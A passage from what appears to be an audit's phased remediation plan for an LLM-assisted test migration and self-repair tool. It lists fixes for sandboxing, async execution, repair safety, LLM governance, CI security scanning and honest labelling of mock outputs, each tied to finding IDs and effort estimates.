| 0.8 | Truthful labelling: "Mock LLM (rule-based)", `analysisSource="mock"`, "similarity score" instead of confidence; fix the README, ARCHITECTURE and api.md claims | H-06, L-01 | S |
| 0.9 | Delete committed venvs, `node_modules`, `dist` and `generated/`; fix `.gitignore`; delete `backend/Dockerfile` | H-08, L-02 | S |

### Phase 1: Pilot readiness (about 1–2 weeks)

| # | Action | Fixes | Effort |
|---|--------|-------|--------|
| 1.1 | Isolated execution worker: separate container or job, no secrets, env **allowlist**, CPU, memory and pids limits, egress policy, Chromium sandbox re-enabled, global concurrency semaphore | H-03, C-02, M-04 | L |
| 1.2 | Async job model for execute, repair and analyze (`202` plus polling or SSE), idempotency keys, cancellation | M-04 | M |
| 1.3 | Persistent store (SQLite then Postgres) with UUID IDs and event history; fix mock qTest dedupe keys; retention and cleanup for runs and artifacts | H-07, M-05, M-06 | M |
| 1.4 | Repair safety: classify by exception type; no auto-apply on assertion steps; require positive "locator absent" proof for css/xpath; LLM pick must meet the minimum score; human approval gate; status renamed to `PASSED_AFTER_REPAIR` | H-05 | M |
| 1.5 | Run repairs in a temporary directory, swap atomically on success | H-04, M-08 | S |
| 1.6 | LLM governance: shared redaction, delimit untrusted input, audit log (prompt hash, model, latency, validated output), `max_tokens`, retry with backoff and 429 handling; data-processing approval for asset content | M-02 | M |
| 1.7 | Reproducible builds: lockfile with hashes, split dev and runtime requirements, base images pinned by digest, dependency provenance check (e.g. `httpx2`) | H-08 | S |
| 1.8 | Server-side body-size limit middleware and multipart limits | M-01 | S |

### Phase 2: Production hardening (about 2–4 weeks)

| # | Action | Fixes | Effort |
|---|--------|-------|--------|
| 2.1 | CI pipeline: lint (ruff, pyflakes), backend and frontend tests, coverage threshold, SCA (`pip-audit`, `npm audit`), container scan, secret scan | M-09, H-08 | M |
| 2.2 | E2E tests in Docker: upload → generate → execute (real Chromium) → demo fault → repair → qTest; plus abuse tests (block bomb, SSRF URLs, oversize uploads) and concurrency tests | M-09 | M |
| 2.3 | Observability: structured JSON logs, request and correlation IDs, metrics (runs, durations, failures, LLM latency and cost), readiness probe that checks browsers, disk and LLM | M-08, M-12 | M |
| 2.4 | CSP and HSTS headers, TLS termination, environment profiles (`prod`), config bounds | M-11, L-04 | S |
| 2.5 | Frontend: summed and server-measured timings, honest metric labelling, disable controls while busy, deduplicated blocking list, component tests for the panels | M-10, M-09 | M |
| 2.6 | AuthN/AuthZ with real identities (OIDC), per-user migration ownership, rate limiting | C-01 | L |

### Phase 3: Functional completeness (roadmap)

| # | Action | Fixes | Effort |
|---|--------|-------|--------|
| 3.1 | Runtime variable store so `web_getText` output can be used; Selenium assertion with explicit wait and normalisation; confirm ICAP semantics for the ASSUMED keywords | M-07 | M |
| 3.2 | Real ICAP export parser once the schema is available; real qTest adapter against a confirmed API | Plan §8, §16 | L |
| 3.3 | Validate the real Azure OpenAI path with recorded evaluations (repair accuracy, false-repair rate) before making GenAI claims | H-06 | M |
| 3.4 | Add `LICENSE` and `docs/demo-script.md`; refactor duplication (shared redaction, migration-state module) | L-03, L-07 | S |

### Recommended order for the immediate demo (if only one day is available)

0.6 → 0.1 → 0.3 → 0.8 → 0.5 → 0.7 → 0.4. These remove the most likely live-demo failures (state wipe, double-click races) and the claims a technical judge would challenge, then close the obvious abuse paths.
